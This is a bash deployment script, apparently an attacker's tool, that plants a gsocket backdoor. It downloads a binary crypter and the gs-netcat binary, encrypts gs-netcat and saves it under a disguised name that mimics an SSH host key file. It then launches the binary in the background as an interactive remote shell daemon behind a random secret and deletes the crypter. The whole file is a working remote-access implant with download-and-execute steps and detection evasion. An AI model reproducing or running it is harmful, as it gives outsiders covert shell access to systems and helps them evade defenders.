#!/bin/bash  

BINCRYPTER_BIN="./bincrypter"  
ENCRYPTED_BIN="./ssh_host_ed23519_key"  
SECRET_LENGTH=22  

GREEN='\033[0;32m'  
YELLOW='\033[1;33m'  
BLUE='\033[0;34m'  
RED='\033[0;31m'  
NC='\033[0m'

log_info() {  
    echo -e "${BLUE}[*] $1${NC}"  
}  

log_success() {  
    echo -e "${GREEN}[+] $1${NC}"  
}  

log_warning() {  
    echo -e "${YELLOW}[!] $1${NC}"  
}  

log_error() {  
    echo -e "${RED}[-] $1${NC}" >&2  
}  

generate_random_string() {  
    local length="$1"  
    head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c "$length"  
}  

log_info "Starting deployment gsocket encrypted..."  

if [ -z "$CRYPT_PASS" ]; then  
    CRYPT_PASS_LENGTH=16
    log_warning "Environment variable CRYPT_PASS is not set. Generating a random password (${CRYPT_PASS_LENGTH} characters)..."
    CRYPT_PASS=$(generate_random_string "$CRYPT_PASS_LENGTH")
    if [ -z "$CRYPT_PASS" ] || [ ${#CRYPT_PASS} -ne "$CRYPT_PASS_LENGTH" ]; then
        log_error "Failed to generate random CRYPT_PASS. Exit."
        exit 1
    fi
    log_success "Random CRYPT_PASS generated: ${YELLOW}${CRYPT_PASS}${NC}"
    log_warning "Make sure you save this password if you need to decrypt/access the binary later!"
fi  

log_info "Downloading bincrypter..."  
BINCRYPTER_URL="https://github.com/hackerschoice/bincrypter/releases/latest/download/bincrypter"  
if ! curl -SsfL "$BINCRYPTER_URL" -o "$BINCRYPTER_BIN"; then  
    log_error "Failed to download bincrypter from $BINCRYPTER_URL. Exit."  
    exit 1  
fi  
log_success "Bincrypter successfully downloaded to $BINCRYPTER_BIN"  

log_info "Giving executable permission to bincrypter..."  
if ! chmod +x "$BINCRYPTER_BIN"; then  
    log_error "Failed to give executable permission to $BINCRYPTER_BIN. Exit."  
    rm -f "$BINCRYPTER_BIN"  
    exit 1  
fi  
log_success "Executable permission given to $BINCRYPTER_BIN"  

log_info "Generating random secret ($SECRET_LENGTH characters)..."  
RANDOM_SECRET=$(generate_random_string "$SECRET_LENGTH")  
if [ -z "$RANDOM_SECRET" ] || [ ${#RANDOM_SECRET} -ne "$SECRET_LENGTH" ]; then  
    log_error "Failed to generate random secret with length $SECRET_LENGTH. Exit."  
    rm -f "$BINCRYPTER_BIN"
    exit 1  
fi  
log_success "Random secret generated: ${YELLOW}${RANDOM_SECRET}${NC}"  

log_info "Downloading and encrypting gs-netcat (using password from CRYPT_PASS)..."  
ARCH=$(uname -m)  
GSOCKET_URL="https://gsocket.io/bin/gs-netcat_mini-linux-${ARCH}"  
log_info "URL gsocket: $GSOCKET_URL"  

if ! curl -SsfL "$GSOCKET_URL" | PASSWORD="$CRYPT_PASS" "$BINCRYPTER_BIN" > "$ENCRYPTED_BIN"; then  
    log_error "Failed to download or encrypt gs-netcat. Ensure CRYPT_PASS is correct. Exit."  
    rm -f "$BINCRYPTER_BIN" "$ENCRYPTED_BIN"
    exit 1  
fi  
log_success "gs-netcat successfully downloaded and encrypted to $ENCRYPTED_BIN"  

log_info "Giving executable permission to $ENCRYPTED_BIN..."  
if ! chmod +x "$ENCRYPTED_BIN"; then  
    log_error "Failed to give executable permission to $ENCRYPTED_BIN. Exit."  
    rm -f "$BINCRYPTER_BIN" "$ENCRYPTED_BIN"
    exit 1  
fi  
log_success "Executable permission given to $ENCRYPTED_BIN"  

GS_ARGS_VAL="-ilD -s ${RANDOM_SECRET}"  
log_info "Running encrypted gsnc with random secret (using password from CRYPT_PASS)..."  
log_info "Command to be executed (without direct execution in log):"  
echo "PASSWORD=***** GS_ARGS=\"$GS_ARGS_VAL\" $ENCRYPTED_BIN"  

PASSWORD="$CRYPT_PASS" GS_ARGS="$GS_ARGS_VAL" "$ENCRYPTED_BIN" &  

sleep 1  

if jobs %1 &> /dev/null; then  
    log_success "gsnc encrypted appears to have been started in the background (PID: $!)."  
    log_warning "Make sure to monitor it separately."  
else  
    exit_status=$?  
    if [ $exit_status -eq 0 ]; then  
        log_success "gsnc encrypted successfully started (exit code 0)."  
    else  
        log_error "gsnc encrypted failed to start or exited with error (exit code $exit_status). Check CRYPT_PASS and process output."  
    fi  
fi  

log_info "Cleaning up bincrypter file..."  
rm -f "$BINCRYPTER_BIN"  
log_success "Bincrypter file has been deleted."  

log_info "Deployment process completed."  

exit 0